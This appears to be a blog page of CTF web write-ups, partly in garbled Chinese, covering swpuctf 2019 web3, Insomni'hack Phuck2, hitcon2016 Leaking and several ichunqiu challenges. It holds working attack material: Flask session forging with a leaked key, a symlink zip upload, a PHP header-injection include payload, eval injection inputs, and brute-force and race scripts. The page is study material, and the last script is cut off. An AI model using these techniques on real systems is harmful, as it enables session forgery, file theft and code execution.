<h2 id="swpuctf-2019-web3">swpuctf 2019 web3</h2>
<p>python flask é¡µé¢, è¾“å…¥é”™è¯¯è·¯ç”± æ¯”å¦‚http://xx.xx.xx.xx/hahaha æŸ¥çœ‹å“åº”å¤´ä¸­æ³„éœ²secretkey, ç„¶åé€šè¿‡è¿™ä¸ªæ¥ç”Ÿæˆ, æ‹¿åˆ°æ­£å¸¸çš„sessionè§£å‡ºæ¥ä¹‹åæ˜¯è¿™ä¹ˆä¸ªç©æ„,è§£æå‡ºæ¥æœ‰ç‚¹é—®é¢˜</p>
<p><img src="C:%5CUsers%5Cch4ser__%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191209001920817.png" alt="image-20191209001920817"></p>
<p>è€Œä¸”flask_session_cookie_manager.pyç”Ÿæˆçš„sessionæ˜¯ä¸è¡Œçš„, ç”¨ä»¥ä¸‹è„šæœ¬ç”Ÿæˆå¯ä»¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  the session cookie is diffent between python2 and python3</span></span><br><span class="line"><span class="comment">#  can also generate session cookie by  flask-unsign --secret 'fb+wwn!n1yo                                                                                                                  +9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y' --sign --cookie "admin"                                                                                                                          from flask import Flask</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'keyqqqwwweee!@#$%^&amp;*'</span></span><br><span class="line"></span><br><span class="line">sessions_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = &#123;<span class="string">u'username'</span>: <span class="string">u'admin'</span>, <span class="string">u'password'</span>: <span class="string">u'admin'</span>, <span class="string">u'id'</span>: <span class="string">'1'</span>, <span class="string">u'is_login'</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    print(sessions_serializer.dumps(target))</span><br><span class="line"></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆsession</p>
<p>å¸¦ç€è¿™ä¸ªsessionè®¿é—®, æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½, åœ¨æœ¬åœ°ç”Ÿæˆè½¯è¿æ¥ä¹‹åå‹ç¼©æˆzipæ•°æ®åŒ…å¹¶ä¸Šä¼ , å¯ä»¥åœ¨å›æ˜¾ä¸­è¯»åˆ°é“¾æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ , æŸ¥çœ‹å‰ç«¯ä»£ç å¯ä»¥å‘ç°flagçš„è·¯å¾„, æ ¹æ®è¿™ä¸ªä¸Šä¼ zipå³å¯</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70392342-21fe3080-1a1a-11ea-9f03-1e22d8bed64d.png" alt="image"></p>
<h2 id="Insomniâ€™hack-2019-Phuck2">Insomniâ€™hack 2019 Phuck2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">'php'</span>);<span class="comment">// æ³¨é‡Šæ‰äº†phpåè®®,ä¸èƒ½ç”¨php://ä¹‹ç±»çš„ç©æ„äº†</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// è¿™ä¸ªå‡½æ•°å°†æ•æ„Ÿå­—ç¬¦ç»™è½¬ä¹‰äº†,æ²¡æ³•åˆ©ç”¨</span></span><br><span class="line">    $mkdir = <span class="function"><span class="keyword">function</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        system(<span class="string">'mkdir -- '</span>.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    $mkdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    chdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    <span class="comment">// æ ¹æ®X-Forwarded-For æ¥åˆ›å»ºæ–°çš„æ–‡ä»¶ç›®å½•</span></span><br><span class="line">    $userFolder = (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $userFolder = basename(str_replace([<span class="string">'.'</span>,<span class="string">'-'</span>],[<span class="string">''</span>,<span class="string">''</span>],$userFolder));</span><br><span class="line">    </span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line"><span class="comment">// å°†serverä¸­æ‰€æœ‰å†…å®¹éƒ½æ”¾è¿›profileæ–‡ä»¶ä¸­,é‚£ä¹ˆæ˜¯å¦å¯ä»¥æŠŠphpä»£ç ç»™æ”¾åœ¨$_SERVERä¸­?</span></span><br><span class="line">    file_put_contents(<span class="string">'profile'</span>,print_r($_SERVER,<span class="keyword">true</span>));</span><br><span class="line"><span class="comment">//åˆ‡å›ä¸Šä¸€ä¸ªç›®å½•</span></span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line"><span class="comment">// è·å–pageå˜é‡çš„å†…å®¹å¹¶æ›¿æ¢ç‚¹å·</span></span><br><span class="line">    $_GET[<span class="string">'page'</span>]=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,$_GET[<span class="string">'page'</span>]);</span><br><span class="line"><span class="comment">// pageæ‰€æŒ‡å‘æ–‡ä»¶çš„å†…å®¹ä¸­ä¸èƒ½æœ‰<span class="meta">&lt;?</span>å’Œphpå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'&lt;?'</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'php'</span>)) &#123;</span><br><span class="line">        <span class="comment">// æ»¡è¶³æ¡ä»¶å°±åŒ…å«page</span></span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å›åˆ°ä¸»ç›®å½•å¹¶åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æ–‡ä»¶</span></span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">'rm -rf users/'</span>.$randFolder);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /index.php?page=data:,123456/profile HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9767</span><br><span class="line">XXX: &lt;?php system(&apos;ls data:,123456&apos;);?&gt;</span><br><span class="line">X-Forwarded-For: data:,123456</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">Cookie: csrftoken=eIQq1N7Rt009rYp1nhaMba1lvw9TZSNcJ6BoSp5KnIjOMSj4kQQ8nu8xQbrGr3IZ; sessionid=rreroe8p3tjqcelwzw1mfhe8dlbhmh8h</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br></pre></td></tr></table></figure>
<p>å…³é”®åœ¨äº<code>page=data:,123456/profile</code> è¿™é‡Œ,å¯¹äº<code>file_get_content</code>å‡½æ•°,å¯ä»¥åˆ©ç”¨dataåè®®æ ¼å¼å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;media type&gt;][;base64],&lt;data&gt;</span><br></pre></td></tr></table></figure>
<p>å‰é¢ä¸¤ä¸ªéƒ½æ˜¯å¯é€‰é¡¹,å¹³æ—¶ç½‘é¡µé‡Œå¤´æœ‰çš„ç›´æ¥ç”¨base64æ–¹å¼ä¼ å…¥å›¾ç‰‡çš„å°±æ˜¯è¿™ç§åè®®.</p>
<p><code>file_get_content('data:,123456/profile')</code> è¿”å›å€¼å°±æ˜¯<code>123456/profile</code> å°±å¯ä»¥ç»•è¿‡æ¡ä»¶åˆ¤æ–­çš„é™åˆ¶äº†.</p>
<p>æ¥ä¸‹æ¥æ˜¯includeâ€¦çœ‹åˆ«äººwpè¯´<code>allow_url_include=Off </code> ä¸çŸ¥é“æ€ä¹ˆçœ‹å‡ºæ¥çš„,ä½†æ˜¯åˆè¯´<code>data:,&lt;ç›®å½•&gt;</code>è¿™ç§æ ¼å¼åˆå¯ä»¥ç»•è¿‡å¹¶æˆåŠŸåŒ…å«,ä¸çŸ¥é“æ˜¯ä¸ºä»€ä¹ˆ.</p>
<p>æ€»ä¹‹åˆ°è¿™é‡Œæ˜¯åŒ…å«äº†<code>data:,123456/profile</code>è¿™ä¸ªæ–‡ä»¶äº†.æ¥ä¸‹æ¥æ‰§è¡Œä»£ç å°±å¯ä»¥äº†.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61700767-a6a02900-ad6f-11e9-9f29-2aa502fabb62.png" alt="image"></p>
<h2 id="hitcon2016-Leaking">hitcon2016 Leaking</h2>
<p>nodejsä»£ç å®¡è®¡</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">"randomstring"</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">"vm2"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">"./config.js"</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var flag_"</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">" = \"flag&#123;"</span> + flag + <span class="string">"&#125;\";"</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            timeout: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">"eval -&gt;"</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"listening on port 3000!"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°,flagè¢«èµ‹å€¼ç»™ä¸€ä¸ªéšæœºå˜é‡,éšåæ£€æµ‹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°,å¦‚æœå‚æ•°çš„é•¿åº¦å°äº12å°±å…ˆåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºç„¶ååœ¨è™šæ‹Ÿæœºä¸­æ‰§è¡Œ,æ‰§è¡Œæ—¶é—´ä¸å¾—è¶…è¿‡ä¸€ç§’,å¹¶ä¸”å°†ç»“æœå›æ˜¾åˆ°å®¢æˆ·ç«¯,å¦åˆ™ä¾ç„¶æ˜¾ç¤ºå½“å‰æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹(ä¹Ÿå°±æ˜¯å½“å‰æ–‡ä»¶).</p>
<p>æ­£å¸¸æ¥è¯´,è™šæ‹Ÿæœºæ˜¯ä¸èƒ½è®¿é—®è™šæ‹Ÿæœºå¤–çš„æ–‡ä»¶å’Œå˜é‡çš„,ä½†æ˜¯å¯ä»¥å¦‚æœæ˜¯å†…å­˜å‘¢?</p>
<p><a href="https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md" target="_blank" rel="noopener">https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md</a></p>
<p>ç…§ç€ä»–çš„demoæ¥å®éªŒä¸€ä¸‹:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="string">'password'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> step=<span class="number">0</span>; step&lt;<span class="number">100000</span>; step++)&#123;</span><br><span class="line">    <span class="keyword">var</span> buf = (<span class="keyword">new</span> Buffer(<span class="number">200</span>)).toString(<span class="string">'ascii'</span>);</span><br><span class="line">    <span class="keyword">if</span>(buf.indexOf(token) !== <span class="number">-1</span>)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'found at step'</span> + step +<span class="string">':'</span> +buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•ç»“æœ:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61681294-8d7f8400-ad3f-11e9-9025-c5381c2d101f.png" alt="image"></p>
<p>æ³¨æ„è¿™ä¸ªæ¼æ´åªåœ¨5.4.1è¿™ç§è¾ƒä½ç‰ˆæœ¬ä¸­ä¼šå‡ºç°,å› æ­¤æ‰§è¡Œçš„æ—¶å€™ä¹Ÿè¦ä½¿ç”¨nvmæ¥æ§åˆ¶ç‰ˆæœ¬æ‰§è¡Œ.</p>
<p>å›åˆ°é¢˜ç›®,çœ‹orange çš„wpçš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while true; do curl &apos;http://1.2.3.4/?data=Buffer(1e4)&apos; | grep -a flag; done;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œ(ç›´æ¥å¤åˆ¶åˆ°å‘½ä»¤è¡Œä¼šè‡ªåŠ¨è½¬ä¹‰,è¦æŠŠè½¬ä¹‰ç¬¦å·å»æ‰)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61681531-58bffc80-ad40-11e9-9d6d-cb8a7cfb2885.png" alt="image"></p>
<p>çœ‹åˆ°å¦å¤–ä¸€ç¯‡wphttps://lorexxar.cn/2016/10/10/hitcon2016/#leaking,å‘ç°æ•°ç»„æ˜¯å¯ä»¥ç»•è¿‡é•¿åº¦é™åˆ¶çš„,ä½†æ˜¯ä»–çš„payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://52.198.115.130:3000/?data[]=for (var step = 0; step &lt; 100000; step++) &#123;var buf = (new Buffer(100)).toString(&apos;ascii&apos;);if (buf.indexOf(&quot;hitcon&#123;&quot;) !== -1) &#123;break;&#125;&#125;buf;</span><br></pre></td></tr></table></figure>
<p>ä¼šè¶…æ—¶,å¤§æ¦‚æ˜¯å› ä¸ºä¸åœ¨ç°åœºå§.</p>
<h2 id="buuoj-unicorn-shop">buuoj unicorn shop</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/61510616-34a1aa00-aa26-11e9-91d3-e63e73d2cb62.png" alt="image"></p>
<p>è¿™é‡Œåªæœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥è¾“å…¥,æˆ‘ä»¬è¦ä¹°çš„ä¸œè¥¿å°±æ˜¯ç¬¬å››ä¸ªç©æ„,ä½†æ˜¯éšä¾¿è¾“å…¥ä¸€äº›ä¸œè¥¿å°±ä¼šå‘ç°,ä»·æ ¼é‚£ä¸€æ åªèƒ½å¡«ä¸€ä¸ªå­—ç¬¦.æŸ¥çœ‹æºç çœ‹çœ‹.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510696-95c97d80-aa26-11e9-8abb-dbdaf20048b2.png" alt="image"></p>
<p>ä»–è¯´è¿™ä¸ªutf-8ç¼–ç å¾ˆé‡è¦â€¦emmmâ€¦æŸ¥äº†ä¸€ä¸‹å‘ç°æœ‰åŸé¢˜.å¯ä»¥ä¼ å…¥ä¸€ä¸ª<code>â†ˆ</code> ç¬¦å·,è¿™ä¸ªæ˜¯æŸä¸ªå›½å®¶çš„è®¡é‡ç¬¦å·,ä»£è¡¨åä¸‡,ä¸è¿‡ä¹Ÿå¯ä»¥ä¼ å…¥<code>äº¿</code> è¿™æ ·ä¸­æ–‡çš„å­—ç¬¦æ¥è¡¨ç¤ºæˆ‘ä»¬çš„ä»·æ ¼.è¿™æ ·å°±èƒ½å¾—åˆ°flagäº†.</p>
<h2 id="ichunqiu-çˆ†ç ´-2">ichunqiu çˆ†ç ´-2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p><code>hello=$GLOBALS</code> works , but flag is not a variable in this case .</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello=file_get_contents(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure>
<p>it work! <code>file_get_contents</code> function will return a variable whose type is <code>string</code>.</p>
<h2 id="ichunqiu-çˆ†ç ´-1">ichunqiu çˆ†ç ´-1</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string(<span class="number">38</span>) <span class="string">"flagåœ¨ä¸€ä¸ªé•¿åº¦ä¸º6çš„å˜é‡é‡Œé¢"</span> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>This puzzle was so easy to mislead us to write a script and trying to enumerate all possibilitiesâ€¦ But actually , when observing the <code>var_dump($$a);</code> we can surely use <code>$GLOBAL</code> to print all variables.</p>
<p>SO, just let <code>hello=GLOBALS</code> and we can get flag.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59854352-59fab400-93a5-11e9-8086-653e956e7013.png" alt="image"></p>
<blockquote>
<p>ps: Global variables in php</p>
<p>$GLOBALS</p>
<p>$_SERVER</p>
<p>$_REQUEST</p>
<p>$_POST</p>
<p>$_GET</p>
<p>$_FILES</p>
<p>$_ENV</p>
<p>$_COOKIE</p>
<p>$_SESSION</p>
</blockquote>
<h2 id="ichunqiu-è±¡æ£‹">ichunqiu è±¡æ£‹</h2>
<p>Find flag by brute-force, finding two scripts from others to learn.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://c8f52486449f4f9fadd09977d3349ea281ba15d9079e48b8.changame.ichunqiu.com/js/'</span></span><br><span class="line">    strs = <span class="string">'abcmlyx'</span></span><br><span class="line">    num = <span class="string">'0123456789'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strs:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> num:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> num:</span><br><span class="line">                       new_url = url+i+j+<span class="string">'ctf'</span>+h+l+n+<span class="string">'.js'</span></span><br><span class="line">                       q.put(new_url)</span><br><span class="line">                       </span><br><span class="line">                       </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requ</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        u = q.get(<span class="literal">True</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(u).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">                print(r)</span><br><span class="line">            q.task_done()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            q.put(u)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    text()</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">        t = threading.Thread(target=requ)</span><br><span class="line">        t.daemon = <span class="literal">True</span></span><br><span class="line">        t.start()</span><br><span class="line">        </span><br><span class="line">    q.join()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author=haya</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line">urllist = []</span><br><span class="line">re1 = <span class="string">'myx'</span></span><br><span class="line">re2 = <span class="string">'012346789'</span></span><br><span class="line">url = <span class="string">'http://d0fdd193e2fa40ab9287e6c40341ef4fc310ea9b723f4b84.game.ichunqiu.com/js/'</span></span><br><span class="line">pool = ThreadPool()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_list</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> re1:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> re2:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> re2:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> re2:</span><br><span class="line">               			urllist.append(url+i+j+<span class="string">'ctf'</span>+k+l+m+<span class="string">'.js'</span>)</span><br><span class="line">    <span class="keyword">return</span> urllist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_open</span><span class="params">(url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = urllib2.urlopen(url).read()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">print</span> url+result</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    urllist = url_list()</span><br><span class="line">    pool.map(url_open, urllist)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="ichunqiu-æ—¶é—´">ichunqiu æ—¶é—´</h2>
<p>Source Code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="string">'å¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´'</span>;</span><br><span class="line">setcookie(<span class="string">'token'</span>,<span class="string">'hello'</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> ($_COOKIE[<span class="string">'token'</span>]==<span class="string">'hello'</span>)&#123;</span><br><span class="line">  $txt = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">  $filename = <span class="string">'u/'</span>.md5(mt_rand(<span class="number">1</span>,<span class="number">1000</span>)).<span class="string">'.txt'</span>;</span><br><span class="line">  file_put_contents($filename,$txt);</span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line">  unlink($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The script to generate filename:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_write</span><span class="params">(begin,end,filename)</span>:</span></span><br><span class="line">    mutex.acquire()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"begin count md5 value from %s to %s"</span> %(str(begin),str(end))</span><br><span class="line">    mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(begin,end):</span><br><span class="line">        tmp = hashlib.md5(str(i))</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        filename.write(<span class="string">'u/'</span>+str(tmp.hexdigest())+<span class="string">'.txt'</span>+<span class="string">'\n'</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    threads = []</span><br><span class="line">    f = open(<span class="string">'dict.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line">    t1 = threading.Thread(target=md5_write, args=(<span class="number">1</span>,<span class="number">250</span>,f))</span><br><span class="line">    t2 = threading.Thread(target=md5_write, args=(<span class="number">250</span>,<span class="number">500</span>,f))</span><br><span class="line">    t3 = threading.Thread(target=md5_write, args=(<span class="number">500</span>,<span class="number">750</span>,f))</span><br><span class="line">    t4 = threading.Thread(target=md5_write, args=(<span class="number">750</span>,<span class="number">1000</span>,f))</span><br><span class="line">    threads.append(t1)</span><br><span class="line">    threads.append(t2)</span><br><span class="line">    threads.append(t3)</span><br><span class="line">    threads.append(t4)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
<p>The script to get flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c726f71499614c9caa416ae33040d067dee7bc7a06e34089.changame.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(line)</span>:</span></span><br><span class="line">    res = requests.get(url+line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        <span class="keyword">print</span> res.content</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    f = open(<span class="string">'dict.txt'</span>)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="comment"># important to add a ',' , which indicate the number of parameters</span></span><br><span class="line">        s = threading.Thread(target = get_flag, args = (line, ))</span><br><span class="line">        threads.append(s)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">'token'</span>:<span class="string">'hello'</span></span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.get(url,cookies=data)</span><br><span class="line">    <span class="keyword">print</span> res.content</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        